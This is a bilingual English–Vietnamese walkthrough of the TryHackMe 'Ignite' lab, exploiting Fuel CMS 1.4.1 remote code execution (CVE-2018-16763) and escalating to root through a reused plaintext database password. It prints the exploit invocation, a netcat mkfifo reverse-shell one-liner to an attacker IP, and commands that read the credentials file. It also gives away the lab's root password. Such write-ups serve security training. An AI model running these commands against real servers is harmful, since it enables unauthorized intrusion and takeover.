# TryHackMe - Ignite Write-up  
*(B√†i Write-up TryHackMe - Ignite)*

## üìù Introduction  
This is a walkthrough for the **Ignite** room on TryHackMe. The target is a machine running Fuel CMS 1.4.1, which is vulnerable to Remote Code Execution (RCE). By exploiting this vulnerability, we gain a foothold, capture the user flag, and escalate privileges to root.  
*(ƒê√¢y l√† h∆∞·ªõng d·∫´n chi ti·∫øt ph√≤ng Ignite. M√°y m·ª•c ti√™u ch·∫°y Fuel CMS 1.4.1, c√≥ l·ªó h·ªïng RCE. Ta s·∫Ω khai th√°c ƒë·ªÉ l·∫•y quy·ªÅn ƒëi·ªÅu khi·ªÉn, flag c·ªßa user v√† leo thang th√†nh root.)*

---

## üîé Enumeration  
First, we scan the target using **Nmap**:  
*(ƒê·∫ßu ti√™n qu√©t c·ªïng b·∫±ng Nmap)*

```bash
nmap -sC -sV -oN ignite.nmap 10.10.X.X
```

- Port **80** is open, running Apache.  
- Visiting the web page reveals **Fuel CMS 1.4.1**.  
*(K·∫øt qu·∫£: ch·ªâ c√≥ port 80 m·ªü, ch·∫°y Apache. Truy c·∫≠p web th·∫•y Fuel CMS 1.4.1.)*

Checking `/robots.txt` shows `/fuel`, which is the admin page.  
*(Trong file robots.txt c√≥ ƒë∆∞·ªùng d·∫´n `/fuel`, ch√≠nh l√† trang qu·∫£n tr·ªã.)*

---

## üí• Exploitation (RCE)  
We search for known exploits using **searchsploit**:  
*(T√¨m exploit c√≥ s·∫µn b·∫±ng searchsploit)*

```bash
searchsploit fuel cms 1.4.1
searchsploit -m 50477
```

Run the Python exploit:  
*(Ch·∫°y script exploit)*

```bash
python3 50477.py -u http://10.10.X.X
```

This gives us a command shell (`cmd>`). Testing with:  
*(S·∫Ω ra shell nh·∫≠p l·ªánh. Test th·ª≠ l·ªánh)*

```bash
cmd> whoami
```

The response is `www-data`.  
*(K·∫øt qu·∫£ tr·∫£ v·ªÅ l√† user www-data.)*

---

## üñ•Ô∏è Reverse Shell  
Set up a listener on our machine:  
*(M·ªü listener tr√™n m√°y m√¨nh)*

```bash
nc -nlvp 4444
```

Inject a reverse shell payload through the exploit:  
*(G·ª≠i payload reverse shell qua exploit)*

```bash
cmd> rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
```

We now have an interactive shell on the target.  
*(Gi·ªù ta c√≥ shell t∆∞∆°ng t√°c tr√™n server.)*

---

## üìÇ User Flag  
Navigate to the home directory and capture the flag:  
*(ƒêi t·ªõi th∆∞ m·ª•c home v√† l·∫•y flag c·ªßa user)*

```bash
cd /home/www-data
cat user.txt
```

---

## üîë Privilege Escalation  
We look for sensitive files inside the web application. Checking the Fuel CMS configuration:  
*(T√¨m file nh·∫°y c·∫£m, m·ªü file config c·ªßa Fuel CMS)*

```bash
cat /var/www/html/fuel/application/config/database.php
```

It reveals database credentials:  
*(Th·∫•y t√†i kho·∫£n v√† m·∫≠t kh·∫©u DB)*

```php
'username' => 'root',
'password' => 'mememe',
```

Try switching to root:  
*(D√πng m·∫≠t kh·∫©u ƒë√≥ th·ª≠ ƒë·ªïi sang root)*

```bash
su root
# password: mememe
```

Success! We are now root.  
*(Th√†nh c√¥ng, ta ƒë√£ c√≥ quy·ªÅn root.)*

---

## üëë Root Flag  
Finally, read the root flag:  
*(Cu·ªëi c√πng, ƒë·ªçc flag root)*

```bash
cd /root
cat root.txt
```

---

## ‚ö° Vulnerabilities Explained  
1. **Remote Code Execution (RCE)** ‚Äì Fuel CMS 1.4.1 is vulnerable to CVE-2018-16763 due to insecure use of `eval()` in PHP.  
   *(L·ªó h·ªïng RCE do Fuel CMS 1.4.1 s·ª≠ d·ª•ng `eval()` kh√¥ng an to√†n.)*  

2. **Insecure Credential Management** ‚Äì Database password is stored in plaintext in `database.php`.  
   *(M·∫≠t kh·∫©u DB l∆∞u d·∫°ng text trong file config.)*  

3. **Password Reuse** ‚Äì The database root password is reused as the system root password.  
   *(Admin t√°i s·ª≠ d·ª•ng m·∫≠t kh·∫©u DB l√†m m·∫≠t kh·∫©u h·ªá th·ªëng.)*  

---

## üèÅ Conclusion  
By identifying Fuel CMS 1.4.1, exploiting its RCE vulnerability, and retrieving credentials from configuration files, we escalated from `www-data` to root. This challenge highlights the dangers of insecure code execution and poor credential management.  
*(B·∫±ng c√°ch nh·∫≠n di·ªán Fuel CMS 1.4.1, khai th√°c l·ªó h·ªïng RCE v√† l·∫•y m·∫≠t kh·∫©u trong file config, ta ƒë√£ leo t·ª´ www-data l√™n root. B√†i n√†y nh·∫•n m·∫°nh nguy hi·ªÉm c·ªßa code thi·∫øu an to√†n v√† qu·∫£n l√Ω m·∫≠t kh·∫©u k√©m.)*
